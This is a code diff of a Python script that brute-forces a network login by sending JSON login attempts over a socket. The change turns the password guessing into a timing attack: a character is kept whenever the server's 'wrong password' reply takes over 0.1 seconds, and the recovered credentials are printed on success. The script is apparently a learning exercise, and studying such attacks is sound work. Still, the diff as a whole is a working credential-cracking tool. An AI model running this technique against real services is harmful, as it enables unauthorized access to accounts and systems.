@@ -1,6 +1,7 @@
 import json
 import socket
 import sys
+from datetime import datetime
 
 
 def yield_variants_logins(file):
@@ -40,6 +41,7 @@ while True:
         print('StopIteration')
 
 while True:
+    start = datetime.now()
     piece = char_set[i]
     if i + 1 == 62:
         i = 0
@@ -48,9 +50,10 @@ while True:
     login_password_json["password"] = password + piece
     my_socket.send(json.dumps(login_password_json).encode())
     response = json.loads(my_socket.recv(buffer_size).decode())
-    if response["result"] == EXCEPTION_DURING_LOGIN:
+    finish = datetime.now()
+    difference = finish - start
+    if difference.total_seconds() > 0.1 and response["result"] == WRONG_PASSWORD:
         password += piece
     if response["result"] == CONNECTION_SUCCESS:
-        password += piece
-        break
-print(json.dumps(login_password_json))
+        print(json.dumps(login_password_json))
+        exit()
